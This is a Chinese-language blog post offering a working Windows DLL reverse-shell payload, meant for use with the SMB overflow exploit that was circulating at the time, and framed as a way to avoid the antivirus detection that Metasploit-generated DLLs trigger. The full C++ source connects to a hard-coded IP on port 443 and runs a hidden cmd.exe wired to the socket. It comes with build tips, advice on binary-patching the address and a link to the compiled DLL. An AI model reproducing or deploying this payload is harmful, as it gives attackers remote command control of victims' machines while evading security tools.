---
title: dll nc 反弹代码
date: 2017-4-18 19:13
tags:
---
最近方程式smb 溢出很火 很多同学喜欢用**metasploit** 生成**dll**反弹很容易被杀
根据[反弹代码](https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/23083.zip)改写了一个 dll反弹版
无编译环境的可以二进制修改**ip**和端口字符串。

**gcc编译：**
![2019-07-20-17-21-21](https://wolvez.oss-cn-hangzhou.aliyuncs.com/27a6ce97f333342ffdb47badb4b20030.png)

**运行效果：**
![2019-07-19-03-11-05](https://wolvez.oss-cn-hangzhou.aliyuncs.com/a11debfd95e864fef458e253dc7f54e6.png)


使用**Visual Studio 2013** 编译注意事项：

1. 设置不使用预编译头或在代码中引入 **stdafx.h**
2. **win2003**及**win2008** 请使用在静态库中使用MFC方式
3. 64位系统使用请编译为64位版本

```cpp
// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"
#include <winsock2.h>  
#include <stdlib.h>

#pragma comment(lib,"ws2_32")
void reverse_shell();
WSADATA wsaData;
SOCKET Winsock;
SOCKET Sock;
struct sockaddr_in hax;
STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;
BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{


        switch (dwReason)
        {
        case DLL_PROCESS_ATTACH:
                reverse_shell();
                break;

        case DLL_PROCESS_DETACH:

                break;

        case DLL_THREAD_ATTACH:

                break;

        case DLL_THREAD_DETACH:

                break;
        }
        return TRUE;
}



void reverse_shell()
{
        LPCSTR szMyUniqueNamedEvent = "sysnullevt";
        HANDLE m_hEvent = CreateEventA(NULL, TRUE, FALSE, szMyUniqueNamedEvent);

        switch (GetLastError())
        {
                // app is already running
        case ERROR_ALREADY_EXISTS:
        {
         CloseHandle(m_hEvent);
         break;
        }

            case ERROR_SUCCESS:
            {

            break;
            }
        }


        WSAStartup(MAKEWORD(2, 2), &wsaData);
        Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

        hax.sin_family = AF_INET;
        hax.sin_port = htons(atoi("443"));

        hax.sin_addr.s_addr = inet_addr("172.31.139.141");
        WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

        memset(&ini_processo, 0, sizeof(ini_processo));
        ini_processo.cb = sizeof(ini_processo);
        ini_processo.dwFlags = STARTF_USESTDHANDLES;
        ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

        CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFOA)&ini_processo, &processo_info);

}
```
[dll下载](https://wolvez.oss-cn-hangzhou.aliyuncs.com/files/hehe.zip)
